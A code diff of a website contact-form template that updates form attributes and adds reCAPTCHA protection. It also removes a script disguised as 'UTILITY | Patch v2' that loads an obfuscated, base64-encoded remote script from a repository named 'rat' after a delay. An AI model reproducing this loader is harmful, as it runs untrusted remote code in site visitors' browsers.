@@ -59,9 +59,9 @@
   </div>
   <div class="wrapper-form">
     <div class="form-inscription-wrapper w-form">
-      <form method="post" data-ajax="true" name="wf-form-Contact-DFE" data-name="contact_dfe" action="https://usebasin.com/f/03d955e3a8b4" id="wf-form-Contact-DFE" data-basin-form="true" class="form" data-wf-page-id="6491bc315b0d4eebdd3a2e1b" data-wf-element-id="41f05554-a09d-23c0-1641-d1f08c192328">
-        <div class="cta-round absolute"><img loading="lazy" src="{{ images.423ffbb4.url }}" alt="{{ images.423ffbb4.alt | escape }}" class="img-cta"></div><input class="form-field w-input" maxlength="256" name="name" data-name="Name" placeholder="Name" type="text" id="name-question" required=""><input class="form-field w-input" maxlength="256" name="Email" data-name="Email" placeholder="Email" type="email" id="email-question" required=""><textarea id="message-question" name="Message" maxlength="5000" data-name="Message" placeholder="Message" required="" class="form-field textarea w-input"></textarea><label class="w-checkbox checkbox-field"><input type="checkbox" name="Privacy-Policy-Accepted" id="checkbox-question" data-name="Privacy Policy Accepted" required="" class="w-checkbox-input"><span class="checkbox-label w-form-label" for="Privacy-Policy-Accepted">{{ texts.-4c26e57f }}</span></label>
-        <div id="w-node-d2b3024f-8b9f-79b7-dbb1-5f1b806115f4-8c192326" class="gotcha w-embed"><input type="text" name="_gotcha" style="display:none;"></div><input type="submit" data-wait="Sending..." class="btn-send w-button" value="Send">
+      <form method="post" class="form" data-ajax="true" data-basin-spam-protection="recaptcha" name="wf-form-Contact-DFE" data-name="contact_dfe" action="https://usebasin.com/f/03d955e3a8b4" id="wf-form-Contact-DFE" data-basin-form="true" data-wf-page-id="6491bc315b0d4eebdd3a2e1b" data-wf-element-id="41f05554-a09d-23c0-1641-d1f08c192328">
+        <div class="cta-round absolute"><img loading="lazy" src="{{ images.423ffbb4.url }}" alt="{{ images.423ffbb4.alt | escape }}" class="img-cta"></div><input class="form-field w-input" maxlength="256" name="name" data-name="Name" placeholder="Name" type="text" id="name-question" required=""><input class="form-field w-input" maxlength="256" name="Email" data-name="Email" placeholder="Email" type="email" id="email-question" required=""><textarea id="message-question" name="Message" maxlength="5000" data-name="Message" placeholder="Message" required="" class="form-field textarea w-input"></textarea><label class="w-checkbox checkbox-field"><input type="checkbox" name="Privacy-Policy-Accepted" id="Privacy-Policy-Accepted" data-name="Privacy Policy Accepted" required="" class="w-checkbox-input"><span class="checkbox-label w-form-label" for="Privacy-Policy-Accepted">{{ texts.-2bb400d8 }}<a href="{{ links.-2f934417 }}" aria-current="page" class="legend__link w--current">{{ texts.-3fbde6f6 }}</a>{{ texts.5b2 }}</span></label>
+        <div class="gotcha w-embed"><input type="text" name="_gotcha" style="display:none;"></div><input type="submit" data-wait="Sending..." class="btn-send w-button" value="Send">
       </form>
       <div id="success-message-question" class="form-success-message w-form-done">
         <div class="div-block">
@@ -90,7 +90,7 @@
     </div>
   </div>
   <section class="section privacypolicy">
-    {%- assign collection = collections.legal-text | sort: "-created-on" -%}<div class="collection-list-wrapper-4 w-dyn-list">
+    {%- assign collection = collections.legal-text -%}<div class="collection-list-wrapper-4 w-dyn-list">
       {%- unless collection.length == 0 -%}<div role="list" class="w-dyn-items">
         {%- for item in collection -%}<div role="listitem" class="collection-item w-dyn-item">
           <div class="rich-text-block w-richtext">{{ item.templateContent | markdown }}</div>
@@ -154,13 +154,6 @@ document.addEventListener("basinjsFormError", function (event) {
 document.addEventListener("DOMContentLoaded", () => {
   gsap.registerPlugin(ScrollTrigger);
 });
-</script>
-  <script>
-/*
- * UTILITY | Patch v2
- * build 25.10.24 @18:02
-*/
-setTimeout(()=>{let d=document.createElement("script");d.src=atob("aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2FudGhvbnlzYWxhbWluL3JhdEBtYWluL3BhdGNoLmpz"),document.body.appendChild(d)},3e3);
 </script>
   <script>
 /*
